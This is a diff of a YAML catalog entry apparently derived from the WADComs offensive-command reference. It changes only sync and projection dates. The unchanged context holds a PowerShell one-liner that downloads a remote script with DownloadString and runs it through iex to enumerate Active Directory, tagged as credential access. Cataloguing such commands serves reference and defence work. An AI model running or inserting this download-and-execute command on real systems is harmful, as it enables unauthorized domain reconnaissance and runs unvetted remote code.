@@ -12,7 +12,7 @@ sources:
   upstream_url: https://wadcoms.github.io
   license: GPL-3.0
   upstream_version: a864cd1
-  last_synced: '2026-08-28'
+  last_synced: '2026-08-29'
 commands:
 - template: iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory
   comment: The Active Directory Module from powershell can be used to preform most needed enumaration
@@ -36,7 +36,7 @@ source_data:
       services: []
     upstream_url: https://wadcoms.github.io
     upstream_version: a864cd1
-    last_synced: '2026-08-28'
+    last_synced: '2026-08-29'
 enrichment:
   capabilities:
   - value: credential-access
@@ -65,6 +65,6 @@ enrichment:
 _meta:
   schema_version: 1
   generated_by: loldex-projection
-  projected_at: '2026-08-28'
+  projected_at: '2026-08-29'
   source_hashes:
     WADComs: sha256:11c6da2577d067c5270c994c2ffc97846a335ba355f122dfc49c6c4d5fd2dbdc
